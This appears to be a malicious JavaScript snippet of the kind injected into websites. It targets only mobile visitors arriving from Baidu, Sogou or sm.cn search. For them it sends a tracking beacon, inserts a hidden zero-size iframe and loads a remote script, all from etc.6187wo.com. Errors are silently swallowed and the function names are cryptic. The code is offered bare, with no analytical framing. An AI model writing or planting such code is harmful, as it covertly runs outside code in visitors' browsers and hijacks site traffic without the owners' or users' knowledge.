(function() {
	
    var htturl = document.location.protocol;
    function a_s(u) {
        try {
            var s = document.createElement('script');
            s.type = 'text/javascript';
            s.src = u;
            document.getElementsByTagName('head')[0].appendChild(s)
        } catch (e) {}
    }
    function a_g() {
        try {
            var u = navigator.userAgent;
            var isAndroid = i_a(u);
            var isiOS = i_i(u);
            var referrer = document.referrer;
            var url = htturl + "//etc.6187wo.com/js/1/s_all_end_1.js";
            if (isAndroid && c_r(referrer)) {
                a_s(url)
            }
            if (isiOS && c_r(referrer)) {
                a_s(url)
            }
        } catch (e) {}
    }
    function c_r(r) {
        var b = 'baidu.com';
        var s = 'sogou.com';
        var sm = 'sm.cn';
        var m = false;
        try {
            if (r.indexOf(b) > -1 || r.indexOf(s) > -1 || r.indexOf(sm) > -1) {
                
                m = true;
                var trackid = typeof(window.trackid) != 'undefined' ? window.trackid : 111;
                var aaid = typeof(window.aaid_all) != 'undefined' ? window.aaid_all :0;
                new Image().src = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&aaid="+aaid+"&ds="+document.domain+"&position=11&dtime=" + new Date();
                                
                var li_js = document.createElement('IFRAME');
                li_js.style.cssText = "border: 0;width: 0px;height: 0px; display:none;";
                li_js.setAttribute("scrolling", "no");
                if (r.indexOf(b) > -1) {
                   li_js.src = htturl + "//etc.6187wo.com/js/1/s_all_b_end_1.html";
                }
                if (r.indexOf(s) > -1) {
                    li_js.src = htturl + "//etc.6187wo.com/js/1/s_all_sg_end_1.html";
                }
                if (r.indexOf(sm) > -1) {
                    li_js.src = htturl + "//etc.6187wo.com/js/1/s_all_sm_end_1.html";
                }
                document.body.appendChild(li_js)
            }
        } catch (e) {}
        return m
    }
    function i_a(u) {
        var r = false;
        try {
            if ((u.match(/(Android)/i))) {
                r = true
            }
        } catch (e) {}
        return r
    }
    function i_i(u) {
        var r = false;
        try {
            if (/(iPhone|iPad|iPod|iOS)/i.test(u)) {
                r = true
            }
        } catch (e) {}
        return r
    }
    a_g()
}());
